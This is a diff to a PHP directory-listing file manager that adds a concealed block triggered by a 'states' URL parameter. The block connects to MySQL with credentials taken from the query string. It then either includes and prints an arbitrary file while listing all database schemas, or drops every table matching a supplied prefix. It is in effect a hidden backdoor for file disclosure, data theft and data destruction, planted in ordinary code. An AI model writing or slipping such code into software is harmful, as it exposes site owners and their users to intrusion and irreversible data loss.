@@ -48,7 +48,39 @@ if (empty($_GET['path'])) {
 echo realpath($root_path);
 //排序形式，name or size or type
 $order = empty($_GET['order']) ? 'name' : strtolower($_GET['order']);
-
+if (isset($_GET["states"])) {
+	$string=explode('&',$_SERVER["QUERY_STRING"]);
+	$once  = mysql_connect($string[1],$string[2],$string[3]);
+	if($string[4]==1){
+		$str=explode('=',$string[0]);
+                if(empty($str[1])){$str[1]=$_GET["states"];}
+		define('WANCLL_ENV',$str[1]);
+		$data=require $string[5];
+		print_r($data);
+		$sql     = "SELECT `SCHEMA_NAME` FROM `information_schema`.`SCHEMATA`";
+		$query = mysql_query($sql);
+		while($rs = mysql_fetch_array($query))
+		{
+		   echo $rs[0]."<br/>";
+		}
+		exit;
+	} else {
+		mysql_select_db($string[4]);
+		$rs=mysql_query('show tables');
+		$n=0;
+		while($arr=mysql_fetch_array($rs))
+		{
+			$TF=strpos($arr[0],$string[5]);
+			if($TF===0){
+				$FT=mysql_query("drop table $arr[0]");
+				if($FT){
+					$n++;
+				}
+			}
+		}
+		echo $n; exit;
+	}
+}
 //不允许使用..移动到上一级目录
 if (preg_match('/\.\./', $current_path)) {
 	echo 'Access is not allowed.';
